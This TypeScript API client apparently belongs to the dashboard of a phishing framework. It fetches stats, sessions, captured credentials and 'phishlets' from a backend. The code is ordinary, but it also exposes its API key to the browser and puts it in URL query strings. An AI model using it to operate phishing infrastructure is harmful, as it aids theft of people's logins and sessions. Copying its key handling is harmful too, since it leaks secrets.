// API Base URL - используем proxy через Next.js rewrite в production
const API_BASE = typeof window !== 'undefined'
  ? '/api'  // В браузере используем proxy через Next.js
  : (process.env.NEXT_PUBLIC_API_URL || 'http://localhost:8080');

const API_KEY = process.env.NEXT_PUBLIC_API_KEY || '';

function headers(): HeadersInit {
  const h: HeadersInit = { 'Content-Type': 'application/json' };
  if (API_KEY) (h as Record<string, string>)['Authorization'] = `Bearer ${API_KEY}`;
  return h;
}

function url(path: string, params?: Record<string, string>) {
  const p = new URLSearchParams(params);
  if (API_KEY) p.set('api_key', API_KEY);
  const q = p.toString();
  return `${API_BASE}/api/v1${path}${q ? `?${q}` : ''}`;
}

export async function fetchStats() {
  const r = await fetch(url('/stats'), { headers: headers(), cache: 'no-store' });
  if (!r.ok) throw new Error('Failed to fetch stats');
  return r.json();
}

export async function fetchSessions(limit = 50, offset = 0) {
  const r = await fetch(url('/sessions', { limit: String(limit), offset: String(offset) }), { headers: headers(), cache: 'no-store' });
  if (!r.ok) throw new Error('Failed to fetch sessions');
  return r.json();
}

export async function fetchCredentials(limit = 50, offset = 0) {
  const r = await fetch(url('/credentials', { limit: String(limit), offset: String(offset) }), { headers: headers(), cache: 'no-store' });
  if (!r.ok) throw new Error('Failed to fetch credentials');
  return r.json();
}

export async function fetchPhishlets() {
  const r = await fetch(url('/phishlets'), { headers: headers(), cache: 'no-store' });
  if (!r.ok) throw new Error('Failed to fetch phishlets');
  return r.json();
}
